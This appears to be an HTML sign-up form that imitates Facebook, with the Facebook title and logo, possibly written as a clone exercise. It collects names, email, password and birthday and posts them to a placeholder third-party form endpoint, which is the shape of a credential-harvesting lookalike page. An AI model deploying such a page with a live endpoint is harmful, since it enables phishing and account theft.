<!DOCTYPE html>
<html lang="en">
    <head> 
        <meta charset="UTF-8"> 
        <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
        <link href="css/main.css" rel="stylesheet">
        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
        <title>Facebook</title>
    </head>

        <body>
          <header>
            <img src="images/facebook_logo.png" alt="Facebook Logo" class="logo">
          </header>
        
          <main>
            <form action="https://your-getform-endpoint.com" method="POST">
              <div class="form-field">
                <label for="first-name">First name</label>
                <input type="text" id="first-name" name="first-name" required minlength="2" maxlength="30">
              </div>
        
              <div class="form-field">
                <label for="last-name">Last name</label>
                <input type="text" id="last-name" name="last-name" required minlength="2" maxlength="30">
              </div>
        
              <div class="form-field">
                <label for="email">Mobile number or email</label>
                <input type="email" id="email" name="email" required>
              </div>
        
              <div class="form-field">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required minlength="8" maxlength="30">
              </div>
        
              <div class="form-field">
                <label for="birthday-day">Birthday</label>
                <select id="birthday-day" name="birthday-day" required>
                  <option value="">Day</option>
                  <option value="1">1</option>
                  <option value="2">2</option>
                  <!-- Add more options -->
                </select>
                <select id="birthday-month" name="birthday-month" required>
                  <option value="">Month</option>
                  <option value="January">January</option>
                  <option value="February">February</option>
                  <!-- Add more options -->
                </select>
                <select id="birthday-year" name="birthday-year" required>
                  <option value="">Year</option>
                  <option value="2020">2020</option>
                  <option value="2021">2021</option>
                  <!-- Add more options -->
                </select>
              </div>
        
              <div class="form-field">
                <label>Gender</label>
                <div class="radio-group">
                  <label for="gender-male">
                    <input type="radio" id="gender-male" name="gender" value="male" required>
                    Male
                  </label>
                  <label for="gender-female">
                    <input type="radio" id="gender-female" name="gender" value="female" required>
                    Female
                  </label>
                  <label for="gender-other">
                    <input type="radio" id="gender-other" name="gender" value="other" required>
                    Other
                  </label>
                </div>
              </div>
        
              <input type="submit" value="Sign Up">
            </form>
          </main>
        
        
        </html>
        
    </body>
    
</html>
